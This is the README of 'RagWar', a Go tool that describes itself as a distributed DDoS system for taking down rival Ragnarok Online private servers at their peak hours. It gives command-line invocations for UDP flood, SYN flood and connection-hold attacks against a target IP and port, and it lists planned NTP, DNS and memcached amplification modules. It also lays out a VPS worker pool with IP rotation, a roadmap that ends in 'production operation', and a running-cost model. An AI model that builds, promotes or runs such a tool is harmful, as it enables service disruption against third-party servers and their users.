# RagWar

**Distributed DDoS attack system for Ragnarok Online private servers.** Strike at their peak hours with surgical precision and minimal cost.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Go Reference](https://pkg.go.dev/badge.github.com/mateusfigueiredo94/ragwar.svg)](https://pkg.go.dev/github.com/mateusfigueiredo94/ragwar)
[![Go Report Card](https://goreportcard.com/badge/github.com/mateusfigueiredo94/ragwar)](https://goreportcard.com/report/github.com/mateusfigueiredo94/ragwar)
[![Go Version](https://img.shields.io/github/go-mod/go-version/mateusfigueiredo94/ragwar)](go.mod)

---

## Overview

Ragnarok private servers run on modest VPS (2–4 vCPU, 1–5 Gbps) using Hercules/RagServer emulators that are **CPU-bound per connection**. Thousands of fake connections can degrade a rival server without needing massive bandwidth.

RagWar automates this with a modular, pluggable attack engine — from application-layer fake clients to transport floods and amplification — all orchestrated from a central controller.

## Quick Start

```bash
# Clone and build
git clone https://github.com/mateusfigueiredo94/ragwar.git
cd ragwar
make build

# Run a UDP flood
./bin/worker attack --target 192.168.1.100:6900 --type udp --pps 50000 --duration 60s

# Run the interactive panel
./bin/worker panel
```

## Features

### Attack Modules

| Module | Layer | Description | Status |
|--------|-------|-------------|--------|
| **UDP Flood** | L3 | High-rate UDP datagrams with randomized payloads | ✅ Ready |
| **SYN Flood** | L3 | Raw TCP SYN packets filling the backlog queue | ✅ Ready |
| **Connection Hold** | L4 | Opens & holds thousands of TCP connections (slowloris-style) | ✅ Ready |
| **Fake Ragnarok Client** | L7 | Connects to login/char/game ports, sends processing-heavy packets | 📋 Planned |
| **NTP Amplification** | L3/4 | NTP monlist amplification for massive bandwidth | 📋 Planned |
| **DNS Amplification** | L3/4 | DNS recursion amplification | 📋 Planned |
| **Memcached SSRF** | L3/4 | UDP memcached amplification via SSRF | 📋 Planned |

### Components

- **Worker** — CLI binary that runs attacks against a target. Supports multiple attack types, live stats, and graceful shutdown.
- **Panel** — Interactive ASCII terminal UI for managing multiple attacks simultaneously. Keyboard-driven with real-time stats.
- **Attack Engine** — Modular, pluggable attack types registered at runtime. Easy to add new modules.

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        RAGWAR SYSTEM                             │
│                                                                  │
│  ┌──────────────┐    ┌────────────────────┐    ┌──────────────┐  │
│  │   CLI Worker  │    │   Control Panel    │    │  Controller   │  │
│  │  (manual CLI) │    │   (keyboard UI)    │    │  (future)     │  │
│  │              │    │                    │    │               │  │
│  │ • attack cmd │    │ • Live stats       │    │ • REST API    │  │
│  │ • types      │    │ • Keyboard ctrl    │    │ • Dashboard   │  │
│  │ • version    │    │ • Multi-attack     │    │ • Scheduling  │  │
│  └──────┬───────┘    └────────┬───────────┘    └───────┬───────┘  │
│         │                     │                        │           │
│         └─────────────────────┼────────────────────────┘           │
│                               │                                    │
│                    ┌──────────▼──────────┐                         │
│                    │   ATTACK ENGINE     │                         │
│                    │                     │                         │
│                    │  ┌───────────────┐  │                         │
│                    │  │ Fake Ragnarok │  │  ─ L7 App Layer        │
│                    │  │ Client        │  │  ─ login/char/game     │
│                    │  └───────────────┘  │                         │
│                    │  ┌───────────────┐  │                         │
│                    │  │ Connection    │  │  ─ L4 Transport        │
│                    │  │ Hold          │  │  ─ TCP exhaustion      │
│                    │  └───────────────┘  │                         │
│                    │  ┌───────────────┐  │                         │
│                    │  │ UDP / SYN     │  │  ─ L3 Network          │
│                    │  │ Flood         │  │  ─ Transport floods    │
│                    │  └───────────────┘  │                         │
│                    │  ┌───────────────┐  │                         │
│                    │  │ Amplification │  │  ─ NTP/DNS/Memcached   │
│                    │  │               │  │  ─ (future)            │
│                    │  └───────────────┘  │                         │
│                    └─────────────────────┘                         │
│                                                                    │
│              ┌─────────────────────────────────────────┐           │
│              │         WORKER POOL (VPS)                │           │
│              │   Region A  │  Region B  │  Other ASNs   │           │
│              │   (5-10 VPS │   ($5-10/ea)│ IP rotation)  │           │
│              └─────────────────────────────────────────┘           │
└─────────────────────────────────────────────────────────────────┘
```

## Usage

### Worker CLI

```bash
# List available attack types
./bin/worker types

# Run a UDP flood (50k pps for 60 seconds)
./bin/worker attack --target 192.168.1.100:6900 --type udp --pps 50000 --duration 60s

# Run a SYN flood (needs root)
sudo ./bin/worker attack --target 192.168.1.100:6900 --type syn --pps 100000

# Run a connection hold attack
./bin/worker attack --target 192.168.1.100:6900 --type hold --conns 2000 --duration 120s

# Quiet mode (no live stats)
./bin/worker attack --target 192.168.1.100:6900 --type udp --pps 50000 --duration 60s --quiet

# Use custom number of worker goroutines
./bin/worker attack --target 192.168.1.100:6900 --type udp --pps 50000 --workers 8
```

### Interactive Panel

```bash
./bin/worker panel
```

Keyboard controls:

| Key | Action |
|-----|--------|
| `a` | Add a new attack (form) |
| `x` | Stop selected attack |
| `d` | Delete selected history row |
| `q` / `Ctrl+C` | Quit (stops all attacks) |

The panel shows:
- Active attacks with live pps/bps/conns stats
- Total packets, bytes, and errors per attack
- Attack state (running / stopped)
- Running count in the status bar

## Project Structure

```
├── cmd/
│   ├── worker/       # Attack node binary (CLI)
│   └── panel/        # Interactive ASCII control panel
├── internal/
│   └── attack/       # Attack engine (udp, syn, hold)
├── .github/          # GitHub templates & CI config
├── .gitignore        # Ignored files
├── Makefile          # Build targets (build, linux, test, clean)
├── go.mod            # Go module definition
├── go.sum            # Dependency checksums
├── PLAN.md           # Detailed project plan
└── README.md         # This file
```

## Default Ports

| Service | Port |
|---------|------|
| Login   | 5121 |
| Char    | 6121 |
| Game    | 6900 |

> Each server may use different ports — recon is essential.

## Roadmap

| Phase | Feature | Status |
|-------|---------|--------|
| 1 | MVP Worker + Panel | 🟡 In progress |
| 2 | Calibrate on own server | ⏳ Planned |
| 3 | Fake Ragnarok Client + Amplification | ⏳ Planned |
| 4 | Controller + REST API + WebSocket | ⏳ Planned |
| 5 | Web Dashboard | ⏳ Planned |
| 6 | Worker Pool with IP rotation | ⏳ Planned |
| 7 | Docker + CI/CD | ⏳ Planned |
| 8 | Production operation | ⏳ Planned |

## Cost Model

| Item | Cost |
|------|------|
| Per worker VPS | ~$5–10/mo |
| Recommended pool (5–10 workers) | ~$30–100/mo |

## License

MIT
